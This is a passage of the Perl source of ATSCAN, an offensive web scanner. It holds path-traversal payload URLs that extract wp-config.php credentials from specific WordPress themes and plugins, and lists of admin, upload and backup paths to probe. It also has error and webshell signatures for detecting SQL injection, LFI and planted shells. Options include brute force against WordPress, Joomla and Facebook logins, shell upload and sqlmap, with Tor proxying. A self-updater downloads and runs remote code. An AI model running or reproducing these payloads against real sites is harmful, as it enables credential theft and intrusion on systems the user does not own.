"/wp-content/force-download.php?file=../wp-config.php",
"/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10",
"/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php",
"/wp-content/themes/SMWF/inc/download.php?file=../wp-config.php",
"/wp-content/themes/markant/download.php?file=../../wp-config.php",
"/wp-content/themes/yakimabait/download.php?file=./wp-config.php",
"/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php",
"/wp-content/themes/felis/download.php?file=../wp-config.php",
"/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php",
"/wp-content/themes/trinity/lib/scripts/download.php?file=../../../../../wp-config.php",
"/wp-content/themes/epic/includes/download.php?file=wp-config.php",
"/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php",
"/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php",
"/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php",
"/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php",
"/wp-content/themes/lote27/download.php?download=../../../wp-config.php",
"/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php",
"/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php",
"/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/wamp/www/wp-config.php",
"/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/xampp/htdocs/wp-config.php",
"/wp-content/plugins/justified-image-grid/download.php?file=file:///var/www/wp-config.php",
"/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php",
"/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php");
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## ADMIN PAGE
sub ADMIN {@ADMIN=("/admin/", "/admin/login.php", "/myadmin/", "/acceso/", "/administrator/", "/admin1/", "/admin2/", "/admin3/", "/admin4/", "/admin5/", "/usuarios/", "/usuario/", "/administrador/", "/administrateur/", "/moderator/", "/webadmin/", "/adminarea/", "/bb-admin/", "/adminLogin/", "/admin_area/", "/panel-administracion/", "/instadmin/", "/memberadmin/", "/administratorlogin/", "/adm/", "/wp-login.php", "/admin/account.php", "/admin/index.php", "/admin/admin.php", "/admin/account.php", "/admin_area/admin.php", "/admin_area/login.php", "/siteadmin/login.php", "/siteadmin/index.php", "/siteadmin/login.html", "/admin/account.html", "/admin/index.html", "/admin/login.html", "/admin/admin.html", "/admin_area/index.php", "/bb-admin/index.php", "/bb-admin/login.php", "/bb-admin/admin.php", "/admin/home.php", "/admin_area/login.html", "/admin_area/index.html", "/admin/controlpanel.php", "/admin.php", "/admincp/index.asp", "/admincp/login.asp", "/admincp/index.html", "/admin/account.html", "/administracion", "/adminpanel.html", "/webadmin.html", "/webadmin/index.html", "/webadmin/admin.html", "/webadmin/login.html", "/admin/admin_login.html", "/admin_login.html", "/panel-administracion/login.html", "/admin/cp.php", "/cp.php", "/administrator/index.php", "/administrator/login.php", "/nsw/admin/login.php", "/webadmin/login.php", "/admin/admin_login.php", "/admin_login.php", "/administrator/account.php", "/administrator.php", "/admin_area/admin.html", "/pages/admin/admin-login.php", "/admin/admin-login.php", "/admin-login.php", "/bb-admin/index.html", "/bb-admin/login.html", "/acceso.php", "/bb-admin/admin.html", "/admin/home.html", "/login.php", "/modelsearch/login.php", "/moderator.php", "/moderator/login.php", "/moderator/admin.php", "/account.php", "/pages/admin/admin-login.html", "/admin/admin-login.html", "/admin-login.html", "/controlpanel.php", "/admincontrol.php", "/admin/adminLogin.html", "/adminLogin.html", "/admin/adminLogin.html", "/home.html", "/rcjakar/admin/login.php", "/adminarea/index.html", "/adminarea/admin.html", "/webadmin.php", "/webadmin/index.php", "/webadmin/admin.php", "/admin/controlpanel.html", "/admin.html", "/admin/cp.html", "cp.html", "/adminpanel.php", "/moderator.html", "/administrator/index.html", "/administrator/login.html", "/user.html", "/administrator/account.html", "/administrator.html", "/login.html", "/modelsearch/login.html", "/moderator/login.html", "/adminarea/login.html", "/panel-administracion/index.html", "/panel-administracion/admin.html", "/modelsearch/index.html", "/modelsearch/admin.html", "/admincontrol/login.html", "/adm/index.html", "adm.html", "/moderator/admin.html", "/user.php", "account.html", "/controlpanel.html", "/admincontrol.html", "/panel-administracion/login.php", "/wp-login.php", "/adminLogin.php", "/admin/adminLogin.php", "/home.php", "/admin.php", "/adminarea/index.php", "/adminarea/admin.php", "/adminarea/login.php", "/panel-administracion/index.php", "/panel-administracion/admin.php", "/modelsearch/index.php", "/modelsearch/admin.php", "/admincontrol/login.php", "/adm/admloginuser.php", "/admloginuser.php", "/admin2.php", "/admin2/login.php", "/admin2/index.php", "/usuarios/login.php", "/adm/index.php", "/adm.php", "/affiliate.php", "/adm_auth.php", "/memberadmin.php", "/administratorlogin.php");
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## SUBDOMAINS
sub SUBDOMAIN {@SUBDOMAIN =("about.", "abose.", "acme.", "ad.", "admanager.", "admin.", "admins.", "administrador.", "administrateur.", "administrator.", "ads.", "adsense.", "adult.", "adwords.", "affiliate.", "affiliatepage.", "afp.", "analytics.", "android.", "shop.", "echop.", "blog.", "tienda.", "answer.", "ap.", "api.", "apis.", "app.", "bank.", "blogs.", "client.", "clients.", "community.", "content.", "cpanel.", "dashbord.", "data.", "developer.", "developers.", "dl.", "docs.", "documents.", "download.", "downloads.", "encrypted.", "email.", "webmail.", "mail.", "correo.", "ftp.", "forum.", "forums.", "feed.", "feeds.", "file.", "files.", "gov.", "home.", "help.", "invoice.", "invoises.", "items.", "js.", "es.", "it.", "en.", "fr.", "ar.", "legal.", "iphone.", "lab.", "labs.", "list.", "lists.", "log.", "logs.", "errors.", "net.", "mysql.", "mysqldomain.", "net.", "network.", "news.", "ns.", "ns1.", "ns2.", "ns3.", "ns4.", "ns5.", "org.", "panel.", "partner.", "partners.", "pop.", "pop3.", "private.", "proxies.", "public.", "reports.", "root.", "rss.", "prod.", "prods.", "sandbox.", "search.", "server.", "servers.", "signin.", "signup.", "login.", "smtp.", "srntp.", "ssl.", "soap.", "stat.", "statics.", "store.", "status.", "survey.", "sync.", "system.", "text.", "test.", "webadmin.", "webdisk.", "xhtml.", "xhtrnl.", "xml.");
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## UPLOAD FILES
sub UPLOAD {@UPLOAD = ("/up.php", "/up1.php", "up/up.php", "/site/up.php", "/vb/up.php", "/forum/up.php", "/blog/up.php", "/upload.php", "/upload1.php", "/upload2.php", "/vb/upload.php", "/forum/upload.php", "blog/upload.php", "site/upload.php", "download.php");
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## ZIP FILES
sub ZIP {@ZIP = ("/backup.tar.gz", "/backup/backup.tar.gz", "/backup/backup.zip", "/vb/backup.zip", "/site/backup.zip", "/backup.zip", "/backup.rar", "/backup.sql", "/vb/vb.zip", "/vb.zip", "/vb.sql", "/vb.rar", "/vb1.zip", "/vb2.zip", "/vbb.zip", "/vb3.zip", "/upload.zip", "/up/upload.zip", "/joomla.zip", "/joomla.rar", "/joomla.sql", "/wordpress.zip", "/wp/wordpress.zip", "/blog/wordpress.zip", "/wordpress.rar");
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## BROWSER LANGUAGES
my @browserlangs=('fr', 'it', 'ie', 'us', 'br', 'ma', 'dz', 'se', 'nl', 'il', 'ca', 'pt', 'pl', 'eg', 'tn', 'ae', 'qa', 'af', 'iq', 'ch', 'mx', 've', 'es', 'ro', 'ru', 'jp', 'id', 'de', 'ua', 'sa', 'ok', 'fi', 'no', 'cz', 'lu', 'uy');
############################################################################################################################################################################################
############################################################################################################################################################################################
## ERRORS
my @ERROR = ("root:x", "You have an error in your SQL syntax", "Warning: mysql", "ORA-", "Oracle ODBC", "Oracle Error", "Oracle Driver", "Oracle DB2", "error ORA-", "SQL command not properly ended", "DB2 ODBC", "DB2 error", "DB2 Driver", "ODBC SQL", "ODBC DB2", "ODBC Driver", "ODBC Error", "ODBC Microsoft Access", "ODBC Oracle", "ODBC Microsoft Access Driver", "Warning: pg_", "PostgreSql Error:", "Supplied argument is not a valid PostgreSQL result", "function.mysql", "MySQL result index", "MySQL Error", "MySQL ODBC", "PostgreSQL query failed: ERROR: parser: parse error", "Warning: sybase_", "function.sybase", "Sybase result index", "Sybase Error:", "Sybase: Server message:", "ODBC Driver:",  "Database Query", "SQLServer JDBC Driver", "JDBC SQL", "JDBC Oracle", "JDBC MySQL", "JDBC error", "JDBC Driver", "java.io.IOException: InfinityDB", "Warning: include", "Warning: require", "Fatal error: require", "ADODB_Exception", "Warning: include", "Warning: require_once", "function.include", "EDisallowed Parent Path", "function.require","MySQL Driver", "mysqli.query", "num_rows", "mysql error:", "supplied argument is not a valid MySQL result resource", "Error Executing Database Query", "mysql_fetch_assoc", "Warning: main", "Warning: session_start", "Warning: getimagesize", "Warning: array_merge", "Warning: preg_match", "GetArray", "EFetchRow", "Warning: preg_", "Warning: ociexecute", "Warning: ocifetchstatement", "PHP Warning:", "Version Information: Microsoft .NET Framework", "Server.Execute Error", "ASP.NET_SessionId", "ASP.NET is configured to show verbose error messages", "BOF or EOF", "Unclosed quotation mark", "Error converting data type varchar to numeric", "LuaPlayer ERROR:", "CGILua message", "ELua error", "Incorrect syntax near", "Fatal error", "Invalid Querystring", "An illegal character has been found in the statement", "<title>Shell</title>", "<title>(.*)Shell</title>", "<title>(.*)Shell(.*)</title>", "<title>(.*)r57shell(.*)</title>", "Hacked by", "backdoor by", "<title>(.*)C99Shell(.*)</title>");
############################################################################################################################################################################################
############################################################################################################################################################################################
## JOOMLA SITES VERIFICATION
@JOOMCMS = ("/administrator/index.php");
############################################################################################################################################################################################
############################################################################################################################################################################################
## WORDPRESS SITES VERIFICATION
@WPCMS = ("/wp-login.php");
############################################################################################################################################################################################
############################################################################################################################################################################################
## CMS VERIFICATION
my @MODULETYPE = ("<a href=\"https:\/\/wordpress.org\/\">Proudly powered by WordPress", "<meta name=\"generator\" content=\"Joomla", "Powered by <a href=\"http:\/\/www.textpattern.com\" title=\"Textpattern", "<a href=\"http:\/\/www.simplemachines.org/about/copyright.php\" title=\"Free Forum Software\" target=\"_blank\">SMF", "Powered by <a href=\"http:\/\/www.phpbb.com/\">phpBB", "<a href=\"https:\/\/www.vbulletin.com\" id=\"vbulletinlink\">vBulletin", "vBulletin Solutions\, Inc\. All rights reserved", "Powered By <a href=\"http:\/\/www.mybboard.net\" target=\"_blank\">MyBB", "<a href=\"http:\/\/www.cloudflare.com\/\" target=\"_blank\" style", "DDoS protection by CloudFlare", "name=\"Generator\" content=\"Drupal", "<meta name=\"generator\" content=\"PostNuke", "<a href=\"/about.php\">About ATutor", "<META NAME=\"GENERATOR\" CONTENT=\"PHP-Nuke", "Powered by <a href=\"http:\/\/moodle.org\" title=\"Moodle\">Moodle", "<meta name=\"key words\" content=\"moodle", "Powered by <a href=\"http:\/\/www.adaptcms.com\">AdaptCMS", "<meta name=\"generator\" content=\"SilverStripe - http:\/\/silverstripe.org\" \/>", "<a href=\"http:\/\/www.modx.com\" target=\"_blank\"> Powered by MODx", "<meta name=\"generator\" content=\"XOOPS", "Powered by osCommerce", "<a href=\"http:\/\/www.oscommerce.com\" target=\"_blank\">osCommerce", "<a class=\"_blank_blank\" href=\"http:\/\/www.prestashop.com\" target=\"_blank", "Software para Ecommerce de PrestaShop", "<meta name=\"generator\" content=\"b2evolution", "MAGENTO\, INC\. ALL RIGHTS RESERVED", "Magento Ecommerce by Smart Solutions", "all rights reserved Zen Cart", "<a href=\"http:\/\/www.zen-cart.com\" target=\"_blank\">Zen Cart", "Powered by concrete5", "<meta name=\"generator\" content=\"concrete", "Powered By OpenCart");
############################################################################################################################################################################################
############################################################################################################################################################################################
if (!defined $nobanner) {
  ############################################################################################################################################################################################
############################################################################################################################################################################################
## BANNER LOGO RANDOM
my @CODENAME = ("No monopoly for knowledge", "Virgin!! life fuck us all", "! Love Mezguida H4ckers !", "No Pe4ce betwin systems !", "Do not be 4 bl4ck h4cker!", "! Keep c4lm 4nd love me !", "Hacking is not Fucking !!", "No h4y sistem4 4 s4lvo !!", "When is brocken u hair it");
############################################################################################################################################################################################
############################################################################################################################################################################################
## BANNER
  $CODENAME = $CODENAME[int rand @CODENAME];
  print "\n";
  print "\033[1;36m       ###    ########  ######   ######     ###    ##    ##   ";
  print "\033[0;31m(^).-.(^)\n";
  print "\033[1;36m      ## ##      ##    ##    ## ##    ##   ## ##   ###   ##    ";
  print "\033[0;31m(.O_O.)\n";
  print "\033[1;36m     ##   ##     ##    ##       ##        ##   ##  ####  ##  ";
  print "\033[0;31m__(( A ))__\n";
  print "\033[1;36m    ##     ##    ##     ######  ##       ##     ## ## ## ## ";
  print "\033[0;31m(_.-('-')-._)\n";
  print "\033[1;36m    #########    ##          ## ##       ######### ##  ####    ";
  print "\033[0;31m|| T ||\n";
  print "\033[1;36m    ##     ##    ##    ##    ## ##    ## ##     ## ##   ###  ";
  print "\033[0;31m_.' `-' '._\n";
  print "\033[1;36m    ##     ##    ##     ######   ######  ##     ## ##    ##  ";
  print "\033[0;31m`-'--^--`-'\n";
  print "\033[0;31m__________________( $CODENAME )____________(O^^^)___(^^^O)__\n";
  print "\n";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## PRINT DESCLAIMER
desclaimer();
if ((!defined $dork) && (!defined $fbbf) && (!defined $help) && (!defined $Target) && (!defined $rangip) && (!defined $mmd5) && (!defined $mencode64) && (!defined $checkversion) && (!defined $mdecode64)) {
  print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";
  advise2();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## TOR PROXY
if (defined $proxy) {
  $ua->proxy([qw/ http https /] => $proxy);
  $ua->cookie_jar({});
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## TOOL VERSION
sub existantversion {
  $existantversion='version 7.8 Stable';
  return $existantversion;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## CHECK VERSION
sub checkversion {
  testconection();
  existantversion();
  my $URL = 'https://github.com/AlisamTechnology/ATSCAN/blob/master/version.log';
  $request = HTTP::Request->new('GET', $URL);
  my $response = $ua->request($request);
  my $html = $response->content;
  (my $gitversion) = ($html =~ /version(.*)Stable/);
  print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";
  $gitversion = "version".$gitversion."Stable";
  if ($gitversion eq $existantversion) {
	print "\033[0;32m[!] OK! Last $gitversion No need to update!\n";
  }else{	
	print "\033[0;31m[!] $existantversion Update Needed to ";
	print "\033[0;32m$gitversion!\n";
    print "\033[0;33m[!] Do you want to update tool? [Y/n]: ";
    $resp=<STDIN>;
    chomp ($resp);
	my $yes ='Y|y|yes|YES|Yes';
	if ($resp =~ /$yes/) {
      my $URL = "https://raw.githubusercontent.com/AlisamTechnology/ATSCAN/master/atscan.pl";
      $request = HTTP::Request->new('GET', $URL);
      my $response = $ua->request($request);
      my $html = $response->content;
	  if ($response->is_success) {
	    if (-e '/usr/share/doc/ATSCAN/atscan.pl') {
		  unlink '/usr/share/doc/ATSCAN/atscan.pl';
		  open (FILE, '>>/usr/share/doc/ATSCAN/atscan.pl');
          print FILE $response->content;
          close (FILE);
		}else{
		  unlink 'atscan.pl';
		  open (FILE, '>>atscan.pl');
          print FILE $response->content;
          close (FILE);
	    }
	    print "\033[0;32m[!] Tool updeted with success and will restart now!\n";
		sleep(2);
	    if (-e '/usr/share/doc/ATSCAN/atscan.pl') {
	      system("chmod +x /usr/share/doc/ATSCAN/atscan.pl | atscan");
		}else{
		  system("chmod +x atscan.pl | perl ./atscan.pl");
		  exit();
		}	     
      }else{
	    print "\033[0;31m[!] Can not connect to the server!\n";
	  }
	}
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## TIMER
sub timer {
  my ($sec,$min,$hr) = localtime();
  print "[";
  print "$hr:$min:$sec";
  print "] ";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## SCAN INFO
sub osinfo {
  use Config;
  print "\033[1;33m[+] GROUP:: ";
  print "\033[0;36mALISAM TECHNOLOGY SCANNER\n";
  print "\033[1;33m[+] TOOL:: ";
  existantversion();
  print "\033[0;36mATSCAN $existantversion\n";
  print "\033[1;33m[+] PATH:: ";
  print "\033[0;36m$Bin/",basename($0)," \n";
  print "\033[1;33m[+] PERL VERSION:: ";
  print "\033[0;36m$^V \n";
  print "\033[1;33m[+] PLATFORM:: ";
  print "\033[0;36m$Config{osname} ";
  print "$Config{archname}\n";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## ADVISE
sub advise {
  print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";
  print "\033[0;33m[!] Upss.. Invalid arguments! \n";
  $lalwmali = ",basename($0),";
  if ($lalwmali =~ m/\/usr\/share\/doc/i) {
    print "\033[0;33m[!] Usage: atscan <option> \n";
    print "[!] Help: atscan --help \n";
  }else{
    print "\033[0;33m[!] Usage: perl ./",basename($0)," <option> \n";
    print "[!] Help: perl ./",basename($0)," --help \n";
  } 
  exit;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub advise2 {
  $lalwmali = ",basename($0),";
  if ($lalwmali =~ m/\/usr\/share\/doc/i) {
    print "\033[0;33m[!] Usage: atscan <option> \n";
    print "[!] Help: atscan --help \n";
  }else{
    print "\033[0;33m[!] Usage: perl ./",basename($0)," <option> \n";
    print "[!] Help: perl ./",basename($0)," --help \n";
  }
  exit();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## FORWAIT
sub forwait {
  progressbar();
  print "\033[0;33m[!] Please wait... \n";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## PROGRESS BAR
sub progressbar {
  use utf8;
  $| = 1;
  binmode STDOUT, ":utf8";
  print "\033[1;34m[!] ";
  timer();
  my $poop  = "::";
  for (1..30) {
    select(undef, undef, undef, 0.25);
    print "$poop";
  }
  print"\n";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## SCAN DETAILS
sub scandetail {
  if (defined $Target) {
    print "\033[1;33m[!] TARGET:: ";
    print "\033[0;36m$Target ";
	if ($Target =~ m/.txt/i){
	  countinicialtargets();
    }
	print "\n";
  }
  #########################################
  #########################################
  if (defined $rangip) {
    print "\033[1;33m[!] TARGET:: ";
    print "\033[0;36mRange [$rangip]\n";
  }
  #########################################
  #########################################
  print "\033[1;33m[+] PROXY:: ";
  if (defined $proxy) {
    print "\033[0;32m[$proxy]\n";
  }else{
    print "\033[0;36mNo! \n";
  }
  #########################################
  #########################################
  if (defined $password) {
    print "\033[1;33m[+] LIST:: ";
    print "\033[0;36m[$password][";
	countpasswordlist();
	print "\033[0;36m]\n";
  }
  #########################################
  #########################################
  if ((defined $misup) || (defined $validation_text) || (defined $ifinurl)) {
    print "\033[1;33m[+] VALIDATION:: ";
    if (defined $validation_text) { 
      print "\033[0;36m$validation_text ";
    }
    if (defined $misup) { 
      print "\033[0;36m/HTTP/1.1 200 ";
    }
	if (defined $ifinurl) { 
      print "\033[0;36m/Validate Url ";
    }
    print "\n";
  }
  #########################################
  #########################################
  if ((defined $mmd5) || (defined $mdecode64) || (defined $mencode64) || (defined $mdom) || (defined $exploit) || (defined $replace)) {
    print "\033[1;33m[+] EXPLOITATION:: ";
    if (defined $mmd5) {
      print "\033[0;36mMD5 ";
	}
	if (defined $mencode64) {
      print "\033[0;36m/Encode Base64 ";
	}
	if (defined $mdecode64) {
      print "\033[0;36m/Decode Base64 ";
	}
    if (defined $mdom) {
      print "\033[0;36m/Remove parameters ";
    }
	if ((defined $replace) && (defined $with)){
      print "\033[0;36m/Replace  ";
	}
    if (defined $exploit){
      print "\033[0;36m/[";
      countexploits();
      print "\033[0;36m Exploit/s Found!]";
    }
    print "\n";
  }
  #########################################
  #########################################
  if ((defined $mxss) || (defined $mlfi) || (defined $madmin) || (defined $mjoomrfi) || (defined $mwpadf) || (defined $mports) || (defined $mupload) || (defined $mzip) || (defined $mmails) || (defined $joombf) || (defined $wpbf) || (defined $fbbf)) {
    print "\033[1;33m[+] SCAN:: ";
    if (defined $mxss) {
      print "\033[0;36m/Xss ";
	  if (defined $p){
        print "\033[0;36m[Vul Param: $p] ";
	  }
    }
    if (defined $mlfi) {
      print "\033[0;36m/Lfi ";
    }
    if (defined $madmin) {
      print "\033[0;36m/Admin ";
    }
    if (defined $mjoomrfi) {
      print "\033[0;36m/Rfi ";
    }
    if (defined $mwpadf) {
      print "\033[0;36m/Adf ";
    }
    if (defined $mports) {
      print "\033[0;36m/Ports ";
	  
      if (defined $mbasic) {
        if ($mbasic eq "tcp") { print "Basic tcp"; }
        if ($mbasic eq "udp") { print "Basic udp"; }
        if (($mbasic eq "udp+tcp") || ($mbasic eq "tcp+udp")) { print "Basic tcp+udp";}
	  }
      if (defined $mall) {
        if ($mall eq "tcp") { print "Complete tcp";}
        if ($mall eq "udp") { print "Complete udp";}
        if (($mall eq "udp+tcp") || ($mall eq "tcp+udp")) { print "Complete tcp+udp"; }
	  }
      if (defined $muser) {
        if ($muser eq "tcp") { print "Selective tcp";}
        if ($muser eq "udp") { print "Selective udp";}
        if (($muser eq "udp+tcp") || ($muser eq "tcp+udp")) { print "Selective tcp+udp";}
	  }
    }
    if (defined $mupload) {
      print "\033[0;36m/Upload ";
    }
    if (defined $mzip) {
      print "\033[0;36m/Zip ";
    }
    if (defined $mmails) {
      print "\033[0;36m/E-mails ";
    }
	if (defined $wpbf) {
      print "\033[0;36m/WP Brute Force ";
    }
    if (defined $fbbf) {
      print "\033[0;36m/Facebook Brute Force ";
    }
	if (defined $joombf) {
      print "\033[0;36m/Joom Brute Force ";
    }
    print "\n";
  } 
  #########################################
  #########################################
  if ((defined $msites) || (defined $mwpsites) || (defined $mjoomsites) || (defined $msubdomain)){
    print "\033[1;33m[+] GET:: ";
    if (defined $msites) { 
      print "\033[0;36m/Server sites ";
    }
    if (defined $mwpsites) { 
      print "\033[0;36m/WP sites ";
    }
    if (defined $mjoomsites) { 
      print "\033[0;36m/JOOM sites ";
    }
    if (defined $msubdomain) { 
      print "\033[0;36m/Subdomains ";
    }
    print "\n";
  }
  #########################################
  #########################################
  if (defined $shell) {
    print "\033[1;33m[+] SHELL:: ";
    print "\033[0;36m$shell \n";
  }
  if (defined $mlevel) {
    print "\033[1;33m[+] SCAN LEVEL:: ";
    print "\033[0;36m$mlevel \n";
  }
  if ((defined $command) || (defined $sqlmap)){
    print "\033[1;33m[+] EXTERN CMD:: ";
    if (defined $command){
      print "\033[0;36m/External Command ";
    }
    if (defined $sqlmap){
      print "\033[0;36m/Sqlmap ";
	  if (defined $p){
        print "\033[0;36m[Vul Param $p] ";
	  }
    }
    print "\n";
  }
  if (defined $output) {
    print "\033[1;33m[+] OUTPUT:: ";
    print "\033[0;36m$outdir/\n";
  }
  if (defined $checkversion) {
    print "\033[1;33m[+] TASK:: ";
    print "\033[0;36m/Update Version\n";
  }
  if (defined $noinfo) {
    print "\033[1;33m[+] EXTRA:: ";
    print "\033[0;36m/Jump extra info\n";
  }
  if (!defined $mlevel) {
    print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## INTERNET CONNECTION VERIFICATION
sub testconection {
  my $URL = "http://www.google.com";
  $request = HTTP::Request->new('GET', $URL);
  $response = $ua->request($request);
  if ( !$response->is_success ) {
    print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";
    print "\033[0;31m[!] Upss.. Your Internet connection seems not active!\n";
    print "\033[0;31m[!] Check Your Connection OR Proxy Setting!\n";
	exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## BUILD DORK LIST
sub dorklist {
  $checkdorklist = $Bin."/dorks.txt";
  if (-e $checkdorklist){ unlink $checkdorklist};
  my $pat2 = 'inurl:|intitle:|intext:|index of|allinurl';
  my $pat3 = ",";
  if (defined $dork){
	if (substr($dork, -4) eq '.txt') {
      if ($dork eq 'dorks.txt') {
	    print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";
	    print "\033[0;31m[!] Rename your list [$dork] I use the same name!\n";
	    exit();
      }
	  use File::Copy qw(copy);
	  copy $dork, $Bin.'/dorks.txt';
    }else{
	  if ($dork =~ m/$pat2/) {
	    $dork =~ s/$pat2//g;
        $dork =~ s/ /+/g;
      }elsif ($dork =~ m/$pat3/) {
        $dork =~ s/$pat3/ /g;
      }elsif ($dork =~ m/ /) {
        $dork =~ s/ /+/g;
	  }
      my @dorks = split / /, $dork;  
      foreach my $dork (@dorks) {
        open (FILE, '>>'.$Bin.'/dorks.txt');
        print FILE "$dork\n";
        close (FILE);
      }
	}
  }elsif (defined $rangip) {
    if (($rangip =~ /(\d+)\.(\d+)\.(\d+)\.(\d+)\-(\d+)\.(\d+)\.(\d+)\.(\d+)/) && ($1<=255 && $2<=255 && $3<=255 && $4<=255 && $5<=255 && $6<=255 && $7<=255 && $8<=255)) { 
      my $startIp = $1.".".$2.".".$3.".".$4;
      my $endIp = $5.".".$6.".".$7.".".$8;
      my (@ip,@newIp,$i,$newIp,$j,$k,$l);
      open (FILE, '>>'.$Bin.'/dorks.txt');
      @ip = split(/\./,$startIp);
      for($i=$ip[0];$i<=$5;$i++) {
	    $ip[0]=0 if($i == $5);
        for($j=$ip[1];$j<=$6;$j++) {
          $ip[1]=0 if($j == $6);
          for($k=$ip[2];$k<=$7;$k++) {
            $ip[2]=0 if($k == $7);
            for($l=$ip[3];$l<=$8;$l++) {
              $ip[3]=0 if($l == $8);
              @newIp = $newIp = join('.',$i,$j,$k,$l);
              print FILE "$newIp \n";
            }
	      }
		}
      }
	  close (FILE);
	}else{
	  print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";
      print "\033[0;31m[!] $rangip is not a valid range! [Ex: --rang 15.24.123.142-142.11.10.101]\n";
      exit();
	}
  }elsif (defined $Target){
	if (-e '$Bin/dorks.txt'){ unlink '$Bin/dorks.txt'};
	if (substr($Target, -4) eq '.txt') {
      if ($Target eq 'dorks.txt' ) {
	    print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";
	    print "\033[0;31m[!] Rename your list [$dork] I use the same name!\n";
	    exit();
      }
	  use File::Copy qw(copy);
	  copy $Target, $Bin.'/dorks.txt';
    }else{
	  if ($Target =~ m/$pat2/) {
	    $Target =~ s/$pat2//g;
        $Target =~ s/ /+/g;
      }elsif ($Target =~ m/$pat3/) {
        $Target =~ s/$pat3/ /g;
      }elsif ($Target =~ m/ /) {
        $Target =~ s/ /+/g;
	  }
      my @targets = split / /, $Target;
      foreach my $Target (@targets) {
        open (FILE, '>'.$Bin.'/dorks.txt');
        print FILE "$Target\n";
        close (FILE);
	  }
    }
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## CHECK CONECTION + IF NEEDED TARGET LIST
sub ifgettargetlist {
  testconection();
  if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
    targetlist();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## BUILD TARGET LIST
sub targetlist {
  $checkdorklist = $Bin."/search.txt";
  if (-e $checkdorklist){ unlink $checkdorklist};
  my $pat2 = 'inurl:|intitle:|intext:|index of|allinurl';
  my $pat3 = ",";

  if (defined $rangip) {
    if (($rangip =~ /(\d+)\.(\d+)\.(\d+)\.(\d+)\-(\d+)\.(\d+)\.(\d+)\.(\d+)/) && ($1<=255 && $2<=255 && $3<=255 && $4<=255 && $5<=255 && $6<=255 && $7<=255 && $8<=255)) { 
      my $startIp = $1.".".$2.".".$3.".".$4;
      my $endIp = $5.".".$6.".".$7.".".$8;
      my (@ip,@newIp,$i,$newIp,$j,$k,$l);
      open (FILE, '>>'.$Bin.'/search.txt');
      @ip = split(/\./,$startIp);
      for($i=$ip[0];$i<=$5;$i++) {
	    $ip[0]=0 if($i == $5);
        for($j=$ip[1];$j<=$6;$j++) {
          $ip[1]=0 if($j == $6);
          for($k=$ip[2];$k<=$7;$k++) {
            $ip[2]=0 if($k == $7);
            for($l=$ip[3];$l<=$8;$l++) {
              $ip[3]=0 if($l == $8);
              @newIp = $newIp = join('.',$i,$j,$k,$l);
              print FILE "$newIp \n";
            }
          }
	    }
      }
	  close (FILE);
	}else{
	  print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";
      print "\033[0;31m[!] $rangip is not a valid range! [Ex: --rang 15.24.123.142-142.11.10.101]\n";
      exit();
	}
  }elsif (defined $Target) {
	if (substr($Target, -4) eq '.txt') {
      if ($Target eq 'search.txt') {
	    print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";
	    print "\033[0;31m[!] Rename your list [$Target] I use the same name!\n";
	    exit();
      }
	  use File::Copy qw(copy);
	  copy $Target, $Bin.'/search.txt';
    }else{
	  if ($Target =~ m/$pat2/) {
	    $Target =~ s/$pat2//g;
        $Target =~ s/ /+/g;
      }elsif ($Target =~ m/$pat3/) {
        $Target =~ s/$pat3/ /g;
      }elsif ($Target =~ m/ /) {
        $Target =~ s/ /+/g;
	  }
      my @targets = split / /, $Target;
      foreach my $Target (@targets) {
        open (FILE, '>'.$Bin.'/search.txt');
        print FILE "$Target\n";
        close (FILE);
	  }
    }
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## EXPLOIT LIST
if (defined $exploit) {
  $checkdorklist = $Bin."/exploits.txt";
  if (-e $checkdorklist){ unlink $checkdorklist};
  my $pat2 = 'inurl:|intitle:|intext:|index of|allinurl';
  my $pat3 = ",";
  if (substr($exploit, -4) eq '.txt') {
    if ($exploit eq 'exploits.txt') {
	  print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";
